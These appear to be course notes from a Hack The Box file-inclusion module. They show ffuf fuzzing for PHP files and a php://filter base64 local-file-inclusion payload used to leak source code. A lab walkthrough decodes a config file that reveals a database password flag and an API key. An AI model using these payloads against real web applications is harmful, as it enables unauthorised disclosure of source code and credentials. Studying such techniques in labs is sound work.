---
tags: [CWES, HTB, technical-reference]
module: "File Inclusion"
source_file: "CWES.xmind"
---

# PHP Filters

> [!info] Complete technical reference
> Section imported without removing commands, hints, links, notes, or images.

## Input Filters

### filter wrapper

- php://filter/
  - four different types of filters
    - <https://www.php.net/manual/en/filters.string.php>
    - <https://www.php.net/manual/en/filters.convert.php>
    - <https://www.php.net/manual/en/filters.compression.php>
    - <https://www.php.net/manual/en/filters.encryption.php>
## Fuzzing for PHP Files

### ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

- index 200  
  config 302
## Standard PHP Inclusion

### ?language=config

- (.php extension appended by web application)
  - empty result
    - does not render any HTML output
## Source Code Disclosure

### http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config

- PD9waHAK...SNIP...KICB9Ciov
### Decode The Source Code

- echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
  - ...  
    if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {  
    header('HTTP/1.0 403 Forbidden', TRUE, 403);  
    die(header('location: /index.php'));  
    }  
    ...
    - investigate this file for sensitive information like credentials or database keys
## LAB

### Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

- ffuf -u http://154.57.164.74:30466/FUZZ.php -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  - configure               [Status: 302]
    - http://154.57.164.74:30466/index.php?language=php://filter/read=convert.base64-encode/resource=configure
      - PD9waHA....
        - echo 'PD9waH...' | base64 -d
          - <?<!-- -->php  

            if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {  
            header('HTTP/1.0 403 Forbidden', TRUE, 403);  
            die(header('location: /index.php'));  
            }  

            $config = array(  
            'DB_HOST' => 'db.inlanefreight.local',  
            'DB_USERNAME' => 'root',  
            'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',  
            'DB_DATABASE' => 'blogdb'  
            );  

            $API_KEY = "Awew242GDshrf46+35/k";
